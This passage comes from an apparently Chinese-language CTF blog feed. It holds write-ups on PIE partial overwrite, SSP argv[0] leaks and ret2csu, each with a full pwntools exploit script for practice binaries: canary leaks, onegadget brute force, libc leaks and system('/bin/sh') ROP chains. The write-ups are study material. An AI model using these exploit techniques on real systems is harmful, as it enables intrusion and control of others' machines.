    <content type="html"><![CDATA[<h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p><a id="more"></a><h1 id="Babypie"><a href="#Babypie" class="headerlink" title="Babypie"></a>Babypie</h1><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%871.png" alt><br>这是一道保护全开的题<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%872.png" alt></p><p>看到主程序，发现有两处写入</p><p>Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址<br>leak canary<br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。<br>为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%873.png" alt></p><p>发现有个可以直接getshell的函数，直接可以调用<br>我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数</p><p>然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">try:</span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line"></span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">except EOFError:</span><br><span class="line">p.close()</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p>爆破了n遍之后终于。。。<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%874.png" alt></p><p>然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>效果长这样<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%875.png" alt></p><h1 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h1><p>这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，<strong>libc_start_main+192 和 _dl_init+139<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%876.png" alt><br>我们到底选择覆盖哪个呢？这就很茫然了<br>Wiki上说的是：<br>我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。<br>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看</strong>libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。<br>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。<br>而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。<br>举个例子，目前两者之间的偏移为<br>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000<br>那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。<br>然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的）</p><p>所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移）</p><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%877.png" alt><br>然后我们找一个能用的onegadget<br>我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">common_gadget = 0x40059B</span><br><span class="line">def exp():</span><br><span class="line">    for i in range(0x100000):</span><br><span class="line">        # if args[&apos;REMOTE&apos;]:</span><br><span class="line">        #     p = remote(ip, port)</span><br><span class="line">        # else:</span><br><span class="line">        #     p = process(&apos;./gets&apos;)</span><br><span class="line">        # # gdb.attach(p)</span><br><span class="line">        p = process(&apos;./gets&apos;)</span><br><span class="line">        try:</span><br><span class="line">            payload = 0x18 * &apos;a&apos; + p64(common_gadget)</span><br><span class="line">            for _ in range(2):</span><br><span class="line">                payload += &apos;a&apos; * 0x28 + p64(common_gadget)</span><br><span class="line">            payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos;</span><br><span class="line">            p.sendline(payload)</span><br><span class="line"></span><br><span class="line">            p.sendline(&apos;ls&apos;)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            print data</span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">        except Exception:</span><br><span class="line">            p.close()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;partial-overwrite&quot;&gt;&lt;a href=&quot;#partial-overwrite&quot; class=&quot;headerlink&quot; title=&quot;partial overwrite&quot;&gt;&lt;/a&gt;partial overwrite&lt;/h2&gt;&lt;p&gt;我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。&lt;br&gt;（对于绕过PIE的操作我是没怎么接触过的）&lt;br&gt;大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ssp操作</title>
    <link href="http://yoursite.com/2019/08/16/ssp/"/>
    <id>http://yoursite.com/2019/08/16/ssp/</id>
    <published>2019-08-16T03:39:15.000Z</published>
    <updated>2019-09-02T16:12:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串<br>就是通过栈溢出报错信息，泄漏出指定地址的方法：<br>　　stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><a id="more"></a><p>满足条件为<br>1、开了canary<br>2、Flag在程序内</p><p>看wiki里的花式栈溢出的时候看到的题（其实我很迷为啥把它放到花式栈溢出里，之后再细细研究吧）</p><p>关于stack smash</p><p>这个有点开拓我知识面了，对于canary我一直很迷，看到这里才知道canary操作起来是个啥样子的。<br>Wiki原话：</p><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行?__stack_chk_fail?函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。<br>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在?__fortify_fail?函数中就会输出我们想要的信息</p><h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><p>所以我们要找argv[0]的地址，（因为我们要求的偏移就是argv[0] 距离读取的字符串的偏移）</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%871.png" alt></p><p>程序名指向的地址为e159，但是dd98里存放的是指向程序名的地址，所以我们需要的地址为后者<br>接着在输入的地方下个断点，找上一个rsp作为字符串开始的地址</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%872.png" alt></p><p>然后我们就可以算偏移了</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%873.png" alt></p><p>所以我们的偏移为0x218</p><p>看程序会发现在一个地方会有flag的输出</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%874.png" alt></p><p>但是我们看不到flag是什么<br>最无奈的是我们输入的内容会覆盖整个地址，所以我们没有办法直接读出<br>我们只能去找另一处的flag地址，这就接触到里另一个新的知识点了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找（pwndbg的话就用search吧）</span><br></pre></td></tr></table></figure><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%875.png" alt></p><p>现在就可以写exp了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&apos;./smashes&apos;)</span><br><span class="line">p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)</span><br><span class="line"></span><br><span class="line">flag = 0x0400D20</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x218 + p64(flag)</span><br><span class="line">p.recvuntil(&apos;name? &apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;flag: &apos;)</span><br><span class="line">p.sendline(&apos;CTF&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里很坑的就是我找flag是按照程序里给的格式找的，是CTF开头的，但是真正的flag是PCTF（0x600d20那个位置的0x50转字符就是P），所以它的地址得再往前拨一位</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%876.png" alt></p><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>再来做道GUESS<br>这题有三次的输入，我们可以通过三次输入实现我们的leak和读取flag，这题和上面那题的思路大概是一致的，都是读取栈上的字符串，而不需要getshell（上面那题是可以知道flag具体存在哪里了，这题需要libc找）</p><p>本题思路：</p><p>1.泄漏libc的基址<br>2.泄漏environ的地址（也就是栈的地址）<br>3.泄漏flag</p><p>三次泄漏都用到了上一题说的ssp，就是通过栈溢出报错信息，泄漏出指定地址的方法：stack smashing detected:+argv[0]<br>如果我们覆盖argv[0]，便会输出特定字符串</p><p>对environ很迷的我看了一下23R3F大佬的wp，又发现了新的玩意儿(以下来自大佬博客<a href="https://www.jianshu.com/p/cc9d09a3f65f)：" target="_blank" rel="noopener">https://www.jianshu.com/p/cc9d09a3f65f)：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments?section）</span><br><span class="line">用来存储系统环境变量的一份复制文件，进程在运行时可能需要。</span><br><span class="line">例如，运行中的进程，可以通过环境变量来访问路径、shell?名称、主机名等信息。</span><br><span class="line">该节是可写的，因此在格式串（format?string）和缓冲区溢出（buffer?overflow）攻击中都可以攻击该节。</span><br><span class="line">*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。</span><br></pre></td></tr></table></figure><p>好，我们按照刚刚那题的解题步骤，先找argv[0]和字符串开始的地方来计算偏移</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%877.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%878.png" alt></p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%879.png" alt></p><p>算出偏移我们就可以按照思路来写exp了<br>前面两个part如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./GUESS&apos;)</span><br><span class="line">elf = ELF(&apos;./GUESS&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line"># open_flag = 0x400A9A</span><br><span class="line"># argv = 0x7fffffffdda8</span><br><span class="line"># rsi_addr = 0x7fffffffdc80</span><br><span class="line"># distance = 0x128</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x128 + p64(puts_got)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># puts_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;puts_addr:&quot;+hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[&apos;puts&apos;] </span><br><span class="line">environ_addr = libc_base + libc.symbols[&apos;_environ&apos;] </span><br><span class="line">print &quot;libc_base:&quot;+hex(libc_base) </span><br><span class="line">print &quot;environ:&quot;+hex(environ_addr)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x128 + p64(environ_addr) </span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.recvuntil(&apos;stack smashing detected ***: &apos;) </span><br><span class="line">stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]+&apos;\x00\x00&apos;) </span><br><span class="line"># stack_addr = u64(p.recvuntil(&apos; &apos;)[:-1]) </span><br><span class="line">print &quot;stack_addr:&quot;+hex(stack_addr)</span><br></pre></td></tr></table></figure><p>然后我们要算出buf与environ的差值，使程序跳转到flag的位置</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8710.png" alt></p><p>构造最后一步的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x128 + p64(stack_addr-0x168)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>最后效果</p><p><img src="/2019/08/16/ssp/%E5%9B%BE%E7%89%8711.png" alt></p><p>其实还是挺迷的，以后碰到题可能还会懵，先记录着吧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用于开了canary的程序（无法正常爆破canary）就借助这种操作，打印出栈内的字符串&lt;br&gt;就是通过栈溢出报错信息，泄漏出指定地址的方法：&lt;br&gt;　　stack smashing detected:+argv[0]&lt;br&gt;如果我们覆盖argv[0]，便会输出特定字符串&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>libc_csu</title>
    <link href="http://yoursite.com/2019/07/08/libc-csu/"/>
    <id>http://yoursite.com/2019/07/08/libc-csu/</id>
    <published>2019-07-08T15:15:17.000Z</published>
    <updated>2019-07-08T15:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="libc-csu"><a href="#libc-csu" class="headerlink" title="_libc_csu"></a><em>_libc_csu</em></h2><p>1、Ret2csu</p><p>这是一个64位的题，开了NX，照常，进ida里瞄瞄它的大体结构是怎样的。<br>Emmm真是一个异常简洁的main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%871.png" alt></p><p>我们发现它有个pwnme函数哦，那就点进去看一下</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%872.png" alt></p><p>它里面说了ret2win 的第三个参数（rdx）必须为“0xdeadcafebabebeef”，异或出来是“/bin/cat”，先记住它。然后它还有一堆的赋值为0的语句，手欠点开来看，发现它把got表全置0了，那么我们就完全不用考虑got表。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%873.png" alt></p><a id="more"></a><p>然后我们会看到还有一个ret2win函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%874.png" alt></p><p>看到system就知道我们的getshell的关键步骤就在这里了，最后就是要把地址指向ret2win这个函数的，所以下一步就是要去找gadget。</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%875.png" alt></p><p>我们知道ret2win的第三个参数是与rdx有关的，但是我们找不到关于rdx的gadget，所以只能另辟他径。<br>ret2csu这类题目貌似就是通过__libc_csu_init函数的操作（很多gadget的函数）</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%876.png" alt></p><p>由函数体关系得知<br>rbx=0<br>rbp=1（rbp=rbx+1）<br>r12：存调用函数的地址<br>r13：函数的第一个参数<br>r14：函数的第二个参数<br>r15：函数的第三个参数（a3/rdx）</p><p>然后还有一个很严重的问题，有一个setvbuf函数，据大佬所说是会把rdx的值赋值为0xfffffff，然后无法调用ret2win，所以导致在call处程序出错，无法再执行下去（但是我是在是调不到setvbuf那个函数的地方，下断点也没找到那个赋值语句）然后只能选用一个程序的初始化用的函数地址，</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%877.png" alt></p><p>就这两个函数的地址，用这两个函数写入r12里，躲过setvbuf，然后就可以getshell了。</p><p>rdx是由r15传值得到的，而刚好下面的一系列操作包括r15的，所以这些gadget可用，上面的函数有个跳转指令，为了使他不跳转，我们可以直接对rbx和rbp赋值，rbx为0，rbp为1。我们先pop这些寄存器，并且赋值，再进入mov，最后在call的地方调用ret2win，所以r12存的应该是ret2win的地址。<br>理清得差不多了，就开始写exp了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bss = 0x0601060</span></span><br><span class="line">start = 0x0400880<span class="comment">#mov rdx, r15;mov  rsi, r14;mov  edi, r13d;call  qword ptr [r12+rbx*8]</span></span><br><span class="line">end = 0x0400896<span class="comment">#add  rsp, 8;pop  rbx;pop  rbp;pop  r12/r13/r14/r15</span></span><br><span class="line">init = 0x0600E10</span><br><span class="line">win = 0x04007B1</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20+p64(0)</span><br><span class="line">payload += p64(end)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(1)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(init)<span class="comment">#r12</span></span><br><span class="line">payload += p64(0)<span class="comment">#r13</span></span><br><span class="line">payload += p64(0)<span class="comment">#r14</span></span><br><span class="line">payload += p64(0xdeadcafebabebeef)<span class="comment">#r15(rdx)</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload += <span class="string">"a"</span>*56</span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行之后就拿到flag了</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%878.png" alt></p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>Ida里打开main函数</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%879.png" alt><br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8710.png" alt></p><p>发现这个程序调用了write和read两个函数。<br>没有system没有“/bin/sh”<br>看到了熟悉的gadget</p><p><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8711.png" alt></p><p>再看看在write和read里面，参数分别是存入哪些寄存器</p><p>Write<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8712.png" alt></p><p>Read<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8713.png" alt></p><p>易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）<br>在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d</p><p>我们要做的是<br>（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址<br>（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8<br>（3）、调用system函数达成getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level5"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#bss_base = elf.bss()</span></span><br><span class="line">bss_addr = 0x0601040</span><br><span class="line"></span><br><span class="line">start_addr = 0x0400600  <span class="comment">#add rsp, 8 pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">end_addr = 0x040061A  <span class="comment">#mov rdx,13 rsi,r14 eid,r15 call</span></span><br><span class="line">_start = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def csu(rbx,rbp,r12,r13,r14,r15,_start):</span><br><span class="line">payload = <span class="string">"a"</span>*0x80 +p64(0)</span><br><span class="line">payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">payload += p64(start_addr)+<span class="string">"a"</span>*0x38</span><br><span class="line">payload += p64(_start)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,write_got,8,write_got,1,_start)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(8))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">offest = write_addr-libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc.dump(<span class="string">'system'</span>)+offest</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,read_got,16,bss_addr,0,_start)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">csu(0,1,bss_addr,0,0,bss_addr+8,_start)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果<br><img src="/2019/07/08/libc-csu/%E5%9B%BE%E7%89%8714.png" alt></p><h2 id="OJ-level5"><a href="#OJ-level5" class="headerlink" title="OJ level5"></a>OJ 